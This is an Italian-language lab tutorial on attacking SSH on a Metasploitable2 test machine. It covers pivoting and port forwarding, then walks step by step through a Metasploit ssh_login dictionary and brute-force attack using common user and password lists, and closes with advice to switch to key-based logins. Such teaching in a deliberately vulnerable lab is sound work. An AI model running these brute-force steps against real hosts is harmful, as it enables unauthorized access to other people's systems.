# SSH: Secure Shell

SSH è un’alternativaa TLS per realizzare comunicazioni sicure a livello trasporto. É un protocollo crittografico usato per collegarsi ad una macchina remota in maniera sicura. Il protocollo è costituito di 3 livelli: trasporto, autenticazione e connessione.

Ci chiediamo in che modo un attaccante possa sfruttare questo protocollo. Principalmente può essere usato per prendere il controllo di una macchina diversa dalla propria e di conseguenza anonimizzarsi. La macchina sottratta viene chiamata __Pivot__ proprio perché sarà la macchina cardine dalla quale si fanno partire le varie scansioni/enumeration/attacchi. Questo tipo di protocollo viene poi inoltre sfruttato per effettuare hopping tra una macchina e l'altra per entrare in perimetri di sicurezza ristretti, come ad esempio una intranet aziendale.
Esempio: siamo entrati in possesso di una macchina target, dobbiamo fare privilege escalation, procediamo con l'enumerazione e troviamo un’applicazione HTTP vulnerabile. Ho un terminale attivo ma non gli altri strumenti per analizzare facilmente http. Procedo quindi, per mezzo di un remote port forwording, a inoltrare quella porta sulla mia macchina Kali così da poterne disporre e analizzarla attraverso i nostri tool.

Riprendendo l'output dell'enumeration effettuata in precedenza notiamo che l'implementazione installata di SSH è OpenSSH 4.7p1 Debian 8ubuntu1 e addirittura otteniamo informazioni sulla coppia di chiavi che il target utilizza per l'autenticazione. Una usa l'algoritmo DSA, l'altra RSA. 
```
PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
```

Questa volta purtroppo non possiamo fare affidamento al sito [exploit-db.com](exploit-db.com) poiché cercando questa versione di OpenSSH non troviamo particolari vulnerabilità note, quindi cosa possiamo fare? Prima di tutto sappiamo che l'autenticazione con SSH è possibile in tre modi:
  1) __Publickey__, dove si utilizzano chiave pubblica e privata.
  2) __Password__, si invia la password in chiaro ma protetta dal Transport Layer Protocol.
  3) __Hostbased__, dove si verifica l'identità dell'host più che quella dell'utente.

Molto spesso il problema di questa configurazione è che __l’user__ e la __password__ sono sempre uguali. In genere per SSH si cerca di effettuare __attacchi a dizionario__ o a __forza bruta__, ovviamente questa cosa possiamo automatizzarla in metasploit. Lanciamo nuovamente il tool con il comando `msfconsole`.
Nuovamente andiamo a cercare se tra i moduli degli exploit presenti ce n'è uno relativo al servizio che vogliamo attaccare, lanciamo quindi il comando `search ssh_login` la cui esecuzione produce il seguente output:

```
msf6 > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey
```

Come si vede la ricerca ha avuto esito positivo, sono stati trovati ben due moduli. Il primo modulo non solo testa un insieme di credenziali classiche per quel tipo di indirizzi IP ma può anche tentare un approccio brute force; perfetto per i nostri scopi.
Il secondo modulo invece tenta l'approccio attraverso l'autenticazione a chiave pubblica __sapendo che questo metodo è più sicuro__ come opera il modulo? Quello che cerca di fare è scovare una porzione della chiave privata che non sia stata conservata a dovere e provare ad effettuare il login verso diversi dispositivi cercando la combinazione corretta.

Nella cartella del Git troviamo due file chiamati __users.txt__ e __passwords.txt__ che contengono delle entry date dai nomi utenti e password più comuni e conosciuti. Tentiamo il primo approccio.


```
msf6 > use 0
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

```

Settiamo tra le due opzioni __USERPASS_FILE__ e __PASS_FILE__ proprio per utilizzare i due file a nostra disposizione e cercare di trovare una corrispondenza per accedere alla macchina tramite il servizio SSH.

```
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /root/metasploitable2/users.txt
USER_FILE => /root/metasploitable2/users.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set verbose true
verbose => true
msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file /root/metasploitable2/passwords.txt
pass_file => /root/metasploitable2/passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true
stop_on_success => true
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.139.129
RHOSTS => 192.168.139.129
msf6 auxiliary(scanner/ssh/ssh_login) > exploit

```

Facendo così otterremmo un classico attacco a forza bruta ma il problema sta proprio nella complessità computazionale, se nei nostri file avessimo N entry il tempo di exploit sarebbe O(N^2); che ci porterebbe a tempistiche insostenibili a meno di non essere degli elfi. Per questo motivo per velocizzare l'attacco settiamo i seguenti parametri e rilanciamo l'exploit

```
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME msfadmin
USERNAME => msfadmin
```
Questo username lo possiamo ottenere in diversi modi, uno dei quali è proprio l'attacco FTP visto precedentemente oppure con l'SMTP enumeration che vedremo nella successiva sezione.

<img src="/imgs/ssh_exploit.png" width="1000"> </br>

Una volta ottenuti username e password non ci resta che tentare l'accesso tramite il protocollo e vedere cosa abbiamo ricavato

<img src="/imgs/ssh_exploit_compiuto.png" width="800"> </br>

__NOTA__: Quando ci viene richiesto di verificare il server al primo collegamento operiamo out of band quindi con meccanismi che non sono SSH e ci viene chiesto se vogliamo aggiungere questo indirizzo tra gli host conosciuti.

Una buona pratica per il protocollo SSH è quello di settare tutto il protocollo, inizialmente con username e password, poi successivamente disabilitare questa politica d'accesso e usare l'accesso tramite scambio di chiavi pubblica-privata.
